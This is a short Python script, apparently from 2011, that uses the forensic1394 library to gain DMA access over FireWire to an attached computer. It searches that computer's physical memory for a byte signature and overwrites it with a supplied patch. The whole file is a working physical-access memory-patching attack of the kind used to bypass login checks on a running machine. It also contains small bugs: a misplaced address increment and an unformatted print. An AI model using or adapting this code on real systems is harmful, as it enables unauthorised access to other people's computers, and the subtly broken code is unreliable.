'''
Created on Jun 10, 2011

@author: carmaa
'''
#!/usr/bin/env python3.2 # -*- coding: utf-8 -*-
from forensic1394 import Bus
from time import sleep
from binascii import unhexlify
from sys import argv, getdefaultencoding

encoding = getdefaultencoding()
PAGESIZE = 4096
def findsig(d, sig, off):
    # Skip the first 1 MiB of memory
    addr = 1 * 1024 * 1024 + off
    while True:
        # Prepare a batch of 128 requests
        r = [(addr + PAGESIZE * i, len(sig)) for i in range(0, 128)]
        for caddr, cand  in d.readv(r):
            if cand == sig: return caddr
            addr += PAGESIZE * 128
# Parse the command line arguments
sig, patch, off = unhexlify(bytes(argv[1], encoding)), unhexlify(bytes(argv[2], encoding)), int(argv[3])
b = Bus()
# Enable SBP-2 support to ensure we get DMA
b.enable_sbp2()
sleep (30.0)
# Open the first device
d = b.devices()[0]
d.open()
try:
    # Find
    addr = findsig(d, sig, off)
    print("Signature found at %d.", addr)
    # Patch and verify
    d.write(addr, patch)
    assert d.read(addr, len(patch)) == patch
except IOError:
    print("Signature not found.")

